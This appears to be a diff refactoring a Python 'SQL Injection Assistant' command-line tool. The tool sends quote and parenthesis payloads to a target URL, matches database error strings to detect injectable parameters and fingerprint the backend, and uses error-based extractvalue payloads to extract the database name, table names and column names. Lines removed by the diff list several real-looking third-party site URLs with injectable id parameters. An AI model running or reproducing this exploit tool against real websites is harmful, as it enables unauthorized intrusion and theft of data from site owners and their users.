@@ -1,115 +1,116 @@
-import requests, argparse
+import requests
+import argparse
 from bs4 import BeautifulSoup as BS
 
-# http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html
-# https://www.architecturalpapers.ch/index.php?ID=4%27              
-# http://www.wurm.info/index.php?id=8%27                            
-# https://www.cityimmo.ch/reservations.php?lang=FR&todo=res&;id=22
-# http://www.meggieschneider.com/php/detail.php?id=48
-
 def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name):
-    if args.test:
-        urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test + ")", args.test + "')", args.test + '")', args.test + '*'] 
-        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
+    if test:
+        urls = [
+            test + "'", test + '"', test[:-4] + ';', test + ")", test + "')", test + '")', test + '*'
+        ] 
+        vulnerable_text = [
+            'MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result',
+            'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;',
+            'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: '
+        ]
+        vulnerable = False
         try:
             for url in urls:
                 results = requests.get(url)
                 data = results.text
-                soup = BS(data, features='html.parser')
                 for vuln in vulnerable_text:
                     if vuln in data:
-                        string = vuln
                         vulnerable = True
+                        break
             if vulnerable:
                 print('Site is vulnerable!')
+            else:
+                print('Site is not vulnerable!')
         except:
             print('Site is not vulnerable!')
-    elif args.dump:
+    elif dump:
         print('Dumping the database')
-    elif args.tablenames:
+    elif tablenames:
         print("Extracting tables names...")
-        link = str(args.tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
+        link = f"{tablenames} and extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()))"
         results = requests.get(link)
         data = results.text 
-        str_num = str(data).find('error: ')
-        str1_num = data[str_num:]
-        str1 = str1_num[8:]
+        str_num = data.find('error: ')
+        str1 = data[str_num + 8:]
         str2 = str1.find('\'')
         str3 = str1[:str2]
         print(f"\nTable names: {str3}")
-    elif args.columns:
+    elif columns:
         print('Extracting Columns...')
-        link = str(args.columns) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='" + args.colum_name + "'limit 0,1)))--"
+        link = f"{columns} and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='{colum_name}' limit 0,1)))--"
         results = requests.get(link)
         data = results.text
-        
         print(f"Column names: {data}")
-    elif args.dbname:
-        link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
-        print(link)
+    elif dbname:
+        link = f"{dbname} and extractvalue(1,concat(1,(select database()))) --"
         results = requests.get(link)
         data = results.text 
-        str_num = str(data).find('error:')
-        print(str_num) 
-        str1_num = data[str_num:]
-        str1 = str1_num[8:]
-        str2 = str1.find('\'')
-        str3 = str1[:str2]
+        str_num = data.find('error:')
         if str_num == -1:
             print('Access Denied')
         else:
+            str1 = data[str_num + 7:]
+            str2 = str1.find('\'')
+            str3 = str1[:str2]
             print(f"Database name: {str3}")
-    elif args.get_database_type:
-        urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type + ")", args.get_database_type + "')", args.get_database_type + '")', args.get_database_type + '*']
-        db_dict = {
-    "MySQL": [
-        'MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()',
-        '1064 You have an error in your SQL syntax'
-    ],
-    "PostGre": [
-        'PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string',
-        'column not found', 'relation not found', 'function not found'
-    ],
-    "Microsoft_SQL": [
-        'Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark', 'Incorrect syntax near', 'SQL Server error',
-        'The data types ntext and nvarchar are incompatible'
-    ],
-    "Oracle": [
-        'ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression', 'missing keyword', 'missing right parenthesis',
-        'not a valid month'
-    ],
-    "Advantage_Database": [
-        'AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'
-    ],
-    "Firebird": [
-        'Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string',
-        'Invalid token'
-    ]
-}
-        DBFound = 0
-        DBType = ''
+    elif get_database_type:
+        urls = [
+            get_database_type + "'", get_database_type + '"', get_database_type[:-4] + ';',
+            get_database_type + ")", get_database_type + "')", get_database_type + '")',
+            get_database_type + '*'
+        ]
+        DBDict = {
+            "MySQL": [
+                'MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax',
+                'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'
+            ],
+            "PostGre": [
+                'PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string',
+                'unterminated dollar-quoted string', 'column not found', 'relation not found', 'function not found'
+            ],
+            "Microsoft_SQL": [
+                'Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark',
+                'Incorrect syntax near', 'SQL Server error', 'The data types ntext and nvarchar are incompatible'
+            ],
+            "Oracle": [
+                'ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression',
+                'missing keyword', 'missing right parenthesis', 'not a valid month'
+            ],
+            "Advantage_Database": [
+                'AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader',
+                'AdsDataReader', 'AdsError'
+            ],
+            "Firebird": [
+                'Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range',
+                'malformed string', 'Invalid token'
+            ]
+        }
+        DBFound = False
         try:
             for url in urls:
                 results = requests.get(url)
                 data = results.text
-                soup = BS(data, features='html.parser')
-                while not DBFound:
-                    for db, identifiers in DBDict.items():
-                        for dbid in identifiers:
-                            if dbid in data:
-                                DBType = db
-                                DBFound = 1
-                                print(DBType)
-                                break
+                for db, identifiers in DBDict.items():
+                    if any(dbid in data for dbid in identifiers):
+                        print(f"Database type: {db}")
+                        DBFound = True
+                        break
+                if DBFound:
+                    break
+            if not DBFound:
+                print('Database type: Unknown')
         except:
             print('Database type: Unknown')
     else:
         print('Invalid Argument given!')
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='SQL Injection Assistent')
-    ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerablities>', description='SQL Injection Assistent')
-    ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerablities')
+    ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerabilities>', description='SQL Injection Assistant')
+    ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerabilities')
     ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
     ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
     ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
@@ -117,11 +118,8 @@ if __name__ == '__main__':
     ap.add_argument('-cn', '--colum_name', type=str, help='Column Name')
     ap.add_argument('-d', '--dump', type=str, help="Dump the Database")
     args = ap.parse_args()
-    test = args.test
-    dbname = args.dbname
-    tablenames = args.tablenames
-    dump = args.dump
-    columns = args.columns
-    colum_name = args.colum_name
-    get_database_type = args.get_database_type
-    Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
+    
+    Main(
+        args.test, args.get_database_type, args.dbname, args.tablenames,
+        args.dump, args.columns, args.colum_name
+    )
